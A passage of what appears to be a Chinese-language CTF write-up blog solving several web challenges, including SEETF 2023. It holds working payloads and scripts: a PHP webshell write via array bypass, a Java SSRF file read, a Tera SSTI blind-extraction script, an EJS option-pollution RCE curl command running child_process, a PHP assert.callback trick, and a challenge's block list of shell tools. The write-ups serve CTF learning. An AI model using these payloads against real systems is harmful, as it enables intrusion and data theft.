class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">H</span>());</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231104182205.png" alt="Pasted image 20231104182205.png"></p>
<h3 id="Web-web2"><a href="#Web-web2" class="headerlink" title="Web-web2"></a>Web-web2</h3><p>源代码提示:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- backdoor_[a-f0-9]&#123;16&#125;.php --&gt;</span><br></pre></td></tr></table></figure><br>先爆文件名<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://172.10.0.5/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = string.ascii_letters[:<span class="number">26</span>]+<span class="string">&quot;0123456789.&quot;</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;backdoor_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;filename&quot;</span>: <span class="string">f&quot;glob:///var/www/html/<span class="subst">&#123;path+s&#125;</span>*&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;yesyesyes&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            path += s</span><br><span class="line">            <span class="built_in">print</span>(i, path)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>/backdoor_00fbc51dcdf9eef767597fd26119a894.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="variable">$title</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)&gt;<span class="number">5</span>||<span class="title function_ invoke__">strlen</span>(<span class="variable">$title</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="variable">$title</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$title</span>)) &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><br>一开始以为是5字符串webshell构造,但是这里指定了system命令是php,所以不行<br>直接数组绕过长度限制<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=jmx0hxq&amp;title[]=1.php&amp;data[]=&lt;?= `cat /flag`?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231104182854.png" alt="Pasted image 20231104182854.png"></p>
<h3 id="Web-HTTP"><a href="#Web-HTTP" class="headerlink" title="Web-HTTP"></a>Web-HTTP</h3><p>先dirsearch扫到/swagger-resources路由</p>
<p>里面有/v3/api-docs路由</p>
<p>提示/proxy/url可以传url,一看就是ssrf页面<br>还有ui页面: <a href="http://172.10.0.3:8080/swagger-ui/index.html">http://172.10.0.3:8080/swagger-ui/index.html</a></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231104180437.png" alt="Pasted image 20231104180437.png"></p>
<p>JAva ssrf 绕过 伪协议参考:<br><a href="https://www.freebuf.com/articles/web/364113.html">https://www.freebuf.com/articles/web/364113.html</a></p>
<ul>
<li>url:file绕过协议限制</li>
<li>%23绕过扩展限制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proxy/url?url=url:file:/flag%23html</span><br></pre></td></tr></table></figure>
<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231104180554.png" alt="Pasted image 20231104180554.png"></li>
</ul>
<h3 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h3><p>嗯<br>当时这个SSTI给我整麻了,我已经猜到它是盲注了,但是标题是Tera,好像是Rust引擎模板,于是去学习一下它的语法:<br><a href="https://www.codenong.com/cs107111967/">https://www.codenong.com/cs107111967/</a></p>
<p>可以看到里面有个matching内置函数,可以匹配正则表达式模式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.10.0.3:8081/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">flag</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#123;% set t=&quot;galf&quot;|reverse %&#125;&#123;% set f=get_env(name=t,default=&quot;123&quot;) %&#125;&#123;% if f is matching(&quot;flag.*&quot;) %&#125;1234&#123;% endif %&#125;&#x27;</span>.replace(<span class="string">&#x27;flag&#x27;</span>,flag)</span><br><span class="line">    txt = requests.post(url,data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;1234&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">s = string.hexdigits + <span class="string">&quot;-+&quot;</span></span><br><span class="line">flag = <span class="string">&quot;^fla..&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">if</span> test(flag + i):</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>这里直接用reverse过滤器来绕过flag敏感字符串,通过环境变量回显来盲注flag</p>
<ul>
<li>^fla..表示fla开头随便后面接两个字符</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>SEECTF2023</title>
    <url>/2024/02/06/SEECTF2023/</url>
    <content><![CDATA[<h3 id="SEETF-2023-Express-JavaScript-Security"><a href="#SEETF-2023-Express-JavaScript-Security" class="headerlink" title="[SEETF 2023]Express JavaScript Security"></a>[SEETF 2023]Express JavaScript Security</h3><p>下载附件,ejs版本3.1.9,存在SSTI<br>main.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BLACKLIST</span> = [</span><br><span class="line">    <span class="string">&quot;outputFunctionName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;escapeFunction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;localsName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;destructuredLocals&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/greet&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">query</span>);<span class="comment">//将HTTP请求参数转化为json格式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">BLACKLIST</span>.<span class="title function_">find</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> data.<span class="title function_">includes</span>(item))) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Can you not?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;greet&#x27;</span>, &#123;</span><br><span class="line">        ...<span class="title class_">JSON</span>.<span class="title function_">parse</span>(data),</span><br><span class="line">        <span class="attr">cache</span>: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>greet.ejs<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-family: &lt;%= font %&gt;; font-size: &lt;%= fontSize %&gt;px;&quot;</span>&gt;</span></span><br><span class="line">        Hello &lt;%= name %&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里index.ejs就算把提交的表单内容提取出来再跳转:<br>/greet?name=<code>你提交的内容</code>&amp;font=<code>你提交的内容</code>&amp;fontSize=20</p>
<p>还有这里黑名单过滤了点字符:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;destructuredLocals&quot;</span><br></pre></td></tr></table></figure><br>这里参考的这位大佬的wp:<br><a href="https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#web">https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#web</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://node4.anna.nssctf.cn:28843/greet&#x27; -G --data-urlencode &#x27;settings[view%20options][debug]=true&#x27; --data-urlencode &#x27;settings[view%20options][client]=true&#x27; --data-urlencode &#x27;settings[view%20options][escape]=(() =&gt; &#123;&#125;);return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&#x27;</span><br></pre></td></tr></table></figure>
<p>本地:<br><img src="https://s2.loli.net/2023/09/23/GVqFPRWcEil3HAS.png" alt="image.png"><br>NSSCTF:<br><img src="https://s2.loli.net/2023/09/23/yAJVL6uwHOEqXjI.png" alt="image.png"><br>curl:<br><img src="https://s2.loli.net/2023/09/23/KVxQgEUjOaTJR4C.png" alt="image.png"></p>
<h3 id="SEETF-2023-Sourceful-Guessless-Web"><a href="#SEETF-2023-Sourceful-Guessless-Web" class="headerlink" title="[SEETF 2023]Sourceful Guessless Web"></a>[SEETF 2023]Sourceful Guessless Web</h3><p>这题NSSCTF平台给改错了,没法复现,我在docker本地复现的,docker地址: <a href="https://github.com/sajjadium/ctf-archives/blob/main/ctfs/SEETF/2023/web/Sourceful_Guessless_Web/">https://github.com/sajjadium/ctf-archives/blob/main/ctfs/SEETF/2023/web/Sourceful_Guessless_Web/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$flag</span> =  <span class="string">&quot;SEE&#123;FAKE_FLAG&#125;&quot;</span>; <span class="comment">// Oops, my dog ate my flag...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">ini_set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$flag</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们传参的flag必须是SEE{}类型才能通过assert断言,这里能利用的只有ini_set()方法<br>这里用到的是<strong>pcre.recursion_limit</strong>:它是一个配置项,用于限制PCRE引擎在匹配过程中的递归深度,它被设置为0时<strong>preg_match</strong>会断言失败</p>
<p><em>assert.callback</em>配置项指定在断言失败被调用的函数,可以参考: <a href="https://www.php.net/manual/zh/info.configuration.php">https://www.php.net/manual/zh/info.configuration.php</a></p>
<p>此时我们知道flag在当前index.php里面,读取文件函数var_dump没有出来源代码,highlight_file无法使用,readfile可以<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?flag=SEE&#123;whatever&#125;&amp;debug=1&amp;config[pcre.backtrack_limit]=0&amp;config[assert.callback]=readfile</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/23/ycVM7JFDQHKpg8w.png" alt="image.png"><br>这里是本地搭建的没有改flag的值</p>
<h3 id="SEETF-2023-File-Uploader-1"><a href="#SEETF-2023-File-Uploader-1" class="headerlink" title="[SEETF 2023]File Uploader 1"></a>[SEETF 2023]File Uploader 1</h3><p>/upload路由看来半天,思路从文件上传bypass变成了filename的ssti<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if the post request has the file part</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the user does not select a file, the browser submits an empty file without a filename.</span></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    fileext = get_fileext(file.filename)</span><br><span class="line"></span><br><span class="line">    file.seek(<span class="number">0</span>, <span class="number">2</span>) <span class="comment"># seeks the end of the file</span></span><br><span class="line">    filesize = file.tell() <span class="comment"># tell at which byte we are</span></span><br><span class="line">    file.seek(<span class="number">0</span>, <span class="number">0</span>) <span class="comment"># go back to the beginning of the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> fileext <span class="keyword">and</span> filesize &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>:</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;ext&#x27;</span>] <span class="keyword">and</span> os.path.exists(os.path.join(UPLOAD_FOLDER, session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>])):</span><br><span class="line">            os.remove(os.path.join(UPLOAD_FOLDER, session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>]))</span><br><span class="line">        session[<span class="string">&#x27;ext&#x27;</span>] = fileext</span><br><span class="line">        filename = session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>]</span><br><span class="line">        file.save(os.path.join(UPLOAD_FOLDER, filename))</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            <span class="subst">&#123;file.filename&#125;</span> is not valid because it is too big or has the wrong extension</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        l1 = [<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;[2]&#x27;</span>, <span class="string">&#x27;flask&#x27;</span>, <span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>] </span><br><span class="line"></span><br><span class="line">        l2 = [<span class="string">&#x27;aa-exec&#x27;</span>, <span class="string">&#x27;agetty&#x27;</span>, <span class="string">&#x27;alpine&#x27;</span>, <span class="string">&#x27;ansible-playbook&#x27;</span>, <span class="string">&#x27;ansible-test&#x27;</span>, <span class="string">&#x27;aoss&#x27;</span>, <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;apt-get&#x27;</span>, <span class="string">&#x27;aria2c&#x27;</span>, <span class="string">&#x27;arj&#x27;</span>, <span class="string">&#x27;arp&#x27;</span>, <span class="string">&#x27;ascii-xfr&#x27;</span>, <span class="string">&#x27;ascii85&#x27;</span>, <span class="string">&#x27;ash&#x27;</span>, <span class="string">&#x27;aspell&#x27;</span>, <span class="string">&#x27;atobm&#x27;</span>, <span class="string">&#x27;awk&#x27;</span>, <span class="string">&#x27;aws&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;base32&#x27;</span>, <span class="string">&#x27;base58&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;basenc&#x27;</span>, <span class="string">&#x27;basez&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;batcat&#x27;</span>, <span class="string">&#x27;bconsole&#x27;</span>, <span class="string">&#x27;bpftrace&#x27;</span>, <span class="string">&#x27;bridge&#x27;</span>, <span class="string">&#x27;bundle&#x27;</span>, <span class="string">&#x27;bundler&#x27;</span>, <span class="string">&#x27;busctl&#x27;</span>, <span class="string">&#x27;busybox&#x27;</span>, <span class="string">&#x27;byebug&#x27;</span>, <span class="string">&#x27;bzip2&#x27;</span>, <span class="string">&#x27;c89&#x27;</span>, <span class="string">&#x27;c99&#x27;</span>, <span class="string">&#x27;cabal&#x27;</span>, <span class="string">&#x27;cancel&#x27;</span>, <span class="string">&#x27;capsh&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;cdist&#x27;</span>, <span class="string">&#x27;certbot&#x27;</span>, <span class="string">&#x27;check_by_ssh&#x27;</span>, <span class="string">&#x27;check_cups&#x27;</span>, <span class="string">&#x27;check_log&#x27;</span>, <span class="string">&#x27;check_memory&#x27;</span>, <span class="string">&#x27;check_raid&#x27;</span>, <span class="string">&#x27;check_ssl_cert&#x27;</span>, <span class="string">&#x27;check_statusfile&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;choom&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;cobc&#x27;</span>, <span class="string">&#x27;column&#x27;</span>, <span class="string">&#x27;comm&#x27;</span>, <span class="string">&#x27;comm &#x27;</span>, <span class="string">&#x27;composer&#x27;</span>, <span class="string">&#x27;cowsay&#x27;</span>, <span class="string">&#x27;cowthink&#x27;</span>, <span class="string">&#x27;cpan&#x27;</span>, <span class="string">&#x27;cpio&#x27;</span>, <span class="string">&#x27;cpulimit&#x27;</span>, <span class="string">&#x27;crash&#x27;</span>, <span class="string">&#x27;crontab&#x27;</span>, <span class="string">&#x27;csh&#x27;</span>, <span class="string">&#x27;csplit&#x27;</span>, <span class="string">&#x27;csvtool&#x27;</span>, <span class="string">&#x27;cupsfilter&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;cut&#x27;</span>, <span class="string">&#x27;dash&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;debugfs&#x27;</span>, <span class="string">&#x27;dialog&#x27;</span>, <span class="string">&#x27;diff&#x27;</span>, <span class="string">&#x27;dig&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;distcc&#x27;</span>, <span class="string">&#x27;dmesg&#x27;</span>, <span class="string">&#x27;dmidecode&#x27;</span>, <span class="string">&#x27;dmsetup&#x27;</span>, <span class="string">&#x27;dnf&#x27;</span>, <span class="string">&#x27;docker&#x27;</span>, <span class="string">&#x27;dos2unix&#x27;</span>, <span class="string">&#x27;dosbox&#x27;</span>, <span class="string">&#x27;dotnet&#x27;</span>, <span class="string">&#x27;dpkg&#x27;</span>, <span class="string">&#x27;dstat&#x27;</span>, <span class="string">&#x27;dvips&#x27;</span>, <span class="string">&#x27;easy_install&#x27;</span>, <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;efax&#x27;</span>, <span class="string">&#x27;elvish&#x27;</span>, <span class="string">&#x27;emacs&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;eqn&#x27;</span>, <span class="string">&#x27;espeak&#x27;</span>, <span class="string">&#x27;exiftool&#x27;</span>, <span class="string">&#x27;expand&#x27;</span>, <span class="string">&#x27;expect&#x27;</span>, <span class="string">&#x27;facter&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;finger&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>, <span class="string">&#x27;flock&#x27;</span>, <span class="string">&#x27;fmt&#x27;</span>, <span class="string">&#x27;fold&#x27;</span>, <span class="string">&#x27;fping&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;gawk&#x27;</span>, <span class="string">&#x27;gcc&#x27;</span>, <span class="string">&#x27;gcloud&#x27;</span>, <span class="string">&#x27;gcore&#x27;</span>, <span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;gem&#x27;</span>, <span class="string">&#x27;genie&#x27;</span>, <span class="string">&#x27;genisoimage&#x27;</span>, <span class="string">&#x27;ghc&#x27;</span>, <span class="string">&#x27;ghci&#x27;</span>, <span class="string">&#x27;gimp&#x27;</span>, <span class="string">&#x27;ginsh&#x27;</span>, <span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;grc&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;gtester&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;head&#x27;</span>, <span class="string">&#x27;hexdump&#x27;</span>, <span class="string">&#x27;highlight&#x27;</span>, <span class="string">&#x27;hping3&#x27;</span>, <span class="string">&#x27;iconv&#x27;</span>, <span class="string">&#x27;ifconfig&#x27;</span>, <span class="string">&#x27;iftop&#x27;</span>, <span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;ionice&#x27;</span>, <span class="string">&#x27;irb&#x27;</span>, <span class="string">&#x27;ispell&#x27;</span>, <span class="string">&#x27;jjs&#x27;</span>, <span class="string">&#x27;joe&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;journalctl&#x27;</span>, <span class="string">&#x27;jrunscript&#x27;</span>, <span class="string">&#x27;jtag&#x27;</span>, <span class="string">&#x27;julia&#x27;</span>, <span class="string">&#x27;knife&#x27;</span>, <span class="string">&#x27;ksh&#x27;</span>, <span class="string">&#x27;ksshell&#x27;</span>, <span class="string">&#x27;ksu&#x27;</span>, <span class="string">&#x27;kubectl&#x27;</span>, <span class="string">&#x27;latex&#x27;</span>, <span 